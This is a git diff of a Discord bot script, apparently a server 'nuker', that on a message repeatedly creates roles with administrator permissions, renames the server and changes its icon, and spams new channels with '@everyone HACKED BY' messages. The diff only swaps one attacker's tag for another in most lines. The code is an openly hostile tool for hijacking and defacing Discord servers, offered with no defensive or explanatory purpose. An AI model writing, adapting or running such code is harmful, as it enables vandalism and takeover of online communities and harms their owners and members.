@@ -27,7 +27,7 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY 3usa qwz mzh",
+                name: "HACKED BY Ell1oT",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -37,11 +37,11 @@ client.on('message', message => {
         
         message.guild.setIcon("https://cdn.discordapp.com/attachments/807205133661765632/811711614327062598/GIF-210113_035754-1.gif");
         client.user.setAvatar("https://cdn.discordapp.com/avatars/651095740390834176/6d552e47f12f7b7f31148d0275b73ec4.png?size=1024")
-        message.guild.setName('HACKED BY 3usa qwz mzh');
+        message.guild.setName('HACKED BY Ell1oT');
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY 3usa qwz mzh', 'text').then(channel => { 
+                message.guild.createChannel('HACKED BY Ell1oT', 'text').then(channel => { 
                 channel.send('@everyone HACKED BY 3usa qwz mzh BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
